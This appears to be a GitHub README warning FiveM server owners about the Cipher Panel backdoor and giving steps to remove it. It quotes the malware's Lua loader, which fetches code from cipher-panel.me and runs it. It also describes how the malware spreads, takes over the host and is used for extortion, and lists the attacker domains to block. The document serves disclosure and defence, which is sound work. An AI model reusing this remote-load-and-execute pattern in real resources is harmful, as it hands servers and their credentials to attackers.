# Cipher Panel
Cipher is a paid Remote Execution/Administration Tool (RAT). Cipher's customers generate 4 lines of Lua code to inject into resources (many of them obfuscate the code) which will download remote code from the Cipher servers. We've found many leaked resources are infected with Cipher-Panel. This repository will talk more about how Cipher works.



# How Cipher Works
Cipher works by releasing infected code/resources to the FiveM public. Server owners/developers take the code (that they don't know is infected) and install it on their servers. Once the resource is installed and ran it will inject its code into other previously clean resources.

The initial infected code boils down to the following:

```
PerformHttpRequest('https://cipher-panel.me/_i/i?to=UNIQUECODE', function (e, d)
	local s = assert(load(d))
	if (d == nil) then return end 
	s() 
end)
```

The Unique Code in the URL request is the Cipher user that now has control of your server. Once this code is run it downloads the remote code (from Cipher) and runs it on line 4 as a function.

This is the basis on how most of Cipher works. It proceeds to download several more requests (found in the code returned by Cipher) and will continue until it injects more pre-existing resources.

After the code is run, it will upload some javascript and override existing files within the system builders directory. 

`resources\[system]\[builders]` 

The code will start propagating itself within all of your resources and files within the fivem server installation to make it difficult to remove.

At this stage, its armageddon and all files within the server are compromised meaning files can be downloaded, uploaded, edited and viewed, including but not limited to just the server.cfg, sql credentials or even steal your cfx license keys. They’re also able to run remote code on the server which leads to the last step.

Cipher is a rat that has the capability of gaining full system administrator access to take over the host machine it's run on. It does this by using powershell to download a rat executable and also add / alter users to provide remote desktop access to your server. This back door approach also supports linux too. 

Cipher customers have been seen attempting to extort servers for money paid in crypto currency in exchange to deter the user of cipher from deleting the server entirely. 

Read Infection Documentation for more information on what it expands into.



# How to remove Cipher.

If you have been infected with Cipher, this is what you must do:

Disconnect from the internet your server and access it via KVM (if possible).

Blacklist their domains on your firewall. This will will slow them down however we’ve seen instances where they will use proxies to evade this but on most leaks this will help.

Edit the hosts file `C://windows/system32/drivers/etc/hosts.txt` and add.

`
0.0.0.0 cipher-panel.me 
0.0.0.0 ciphercheats.com
0.0.0.0 dark-utilities.xyz
`

Install an antivirus software on the host machine to scan for any backdoors / rats. 

Check the system admins on the machine to verify that no unauthorized accounts exist.

Change any passwords you have on the host machine to ensure that they don’t have access.

While your fivem server is turned off, use the provided python script to install a nullifier which will help prevent future infections of cipher and tell you what files are infected. 
 
You can also install this code manually however we expect cipher will attempt to patch this.

scheduler.lua


**Make sure you do not run your FiveM server as ROOT (Linux) or Administrator (Windows)**



# Other things you can do to prevent being attacked by cipher

Consider adding the [Warden](https://discord.com/invite/jeFeDRasfs) to your discord server. It's a great resource that can help remove cheaters and leakers (people who participate in sharing leaked paid resources) from your community or support hack products like cipher. 

Make sure to install the latest updates of whatever framework you are using for [ESX](https://github.com/esx-framework/esx-legacy) | [ESX Discord](https://discord.esx-framework.org) [QBCore](https://github.com/qbcore-framework/qb-core) | [QBCore Discord](https://discord.gg/qbcore) 

Consider investing into a good anticheat for your server like [Phoenix Anticheat](https://discord.com/invite/pac) or [FiveEye](https://dsc.gg/FiveEye) or any other anti-cheat that you feel comfortable using. 

Buy resources from only reputable places that you feel comfortable purchasing from either Tebex listed stores or from places like [Modit](https://modit.store/), if you're unsure about a store, perhaps ask for guidance on the warden discord. 

Be extremely sketchy on code you get that is encrypted or downloaded from shady sources.

Lastly, the most important thing… DON'T USE LEAKED RESOURCES!


## Cipher Customers

If you are a customer of cipher, we suggest canceling your subscriptions and getting a refund.
